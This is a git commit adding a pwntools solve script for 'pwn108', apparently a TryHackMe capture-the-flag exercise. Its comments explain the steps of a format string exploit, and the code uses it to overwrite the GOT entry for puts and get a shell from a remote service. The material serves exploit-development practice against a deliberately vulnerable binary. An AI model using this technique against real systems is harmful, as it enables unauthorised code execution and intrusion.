7180ef95a3b15989f2879def8b03c7a66481f8d2
yamsbot <devonbonderenka@gmail.com>
2024-05-02 14:13:56 -0400

    pwn108

---
+++ thm_pwn101/pwn108_remote_solve.py
@@ -0,0 +1,41 @@
+#!/usr/bin/python3
+from pwn import *
+
+'''
+# What will we learn
+GOT overwrites
+
+# notable
+$ checksec pwn108
+    RELRO:    **Partial RELRO**
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      **No PIE (0x400000)**
+
+# High level overview
+1. pdf @ sym.holidays (radare2) reveals that the function calls /bin/sh
+2. buf is called by printf with no formatting, so we have a format string exploit  
+3. (local & remote) no "name" input, payload in "No" our input starts @ %10$lX
+4. puts is called after printf, so we want to replace GOT puts with the address of sym.holidays
+
+# misc
+no aslr
+sym.holidays  @ 0x0040123b
+buffer starts @ %10$lX
+'''
+
+elf = context.binary = ELF('./pwn108', checksec=False)
+sym_holidays = int('0x0040123b', 16)
+
+payload = fmtstr_payload(10, {elf.got['puts'] : sym_holidays})
+
+# start process and send blank line for name
+ip_address = "fill me :P"
+p = remote(f"{ip_address}", 9008)
+p.recvuntil(b"name]: ")
+p.sendline()
+
+# send payload and spawn interactive session
+p.recvuntil(b"No]: ")
+p.sendline(payload)
+p.interactive()
